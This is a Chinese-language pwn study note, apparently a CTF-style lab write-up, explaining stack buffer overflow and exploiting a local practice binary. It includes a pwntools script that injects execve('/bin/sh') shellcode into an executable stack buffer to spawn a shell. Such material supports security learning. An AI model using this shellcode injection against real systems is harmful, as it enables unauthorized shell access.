# stackOverflow

## 简介

栈溢出(stackoverflow)是是缓冲区溢出的一种形式，造成这种漏洞的原因是没有进行合理的边界检查     

比如用于保存输入的缓冲区，有10字节大小，如果你用于接受输入的函数是类似gets或是接受的输入  
大于缓冲区的能够保存的字符数，这会使程序覆写掉缓冲区外部的某些数据他可能是用户变量数据，
也可能是某些与执行流重要的程序数据  

绝大部分情况下这会导致程序直接崩溃，但如果攻击者恶意利用漏洞构造栈上数据，可能会对系统安
全造成致命威胁  

## 实例stackOverflow  

### ida静态分析  

---  

![1.png](https://github.com/S0DUKU/PWNnote/blob/master/StackOverflow/images/1.png)  

---  

迅速定位到漏洞点，read函数读取0x100个字节到一个字符变量的地址，而接下来，程序会调用v6处
一段缓冲区存储的机器指令，由于缓冲区的溢出，有机会覆盖v6缓冲区的数据，将我们自己编写的机
器码存储进去，并调用(可以成功调用这个栈上的函数是因为关闭了栈不可执行保护)。    

### 攻击脚本  

```  
from pwn import *  

#构造exec系统调用所需的参数 '/bin/sh' 填充直到v6处
code1 = '/'
code2 = 'bin/sh\0\0' 

#构造shellcode,调用系统调用并把传递过来的地址参数运用起来

code2 += asm('mov eax,11')
code2 += asm('mov ebx,[esp + 4]')
code2 += asm('xor ecx,ecx')
code2 += asm('xor edx,edx')
code2 += asm('int 0x80')
code2 += asm('ret')

r = process('./stackOverflow')
r.send(code1)
r.send(code2)
r.interactive()  

```  

### 试验  

---  

![2.png](https://github.com/S0DUKU/PWNnote/blob/master/StackOverflow/images/2.png)    

---  






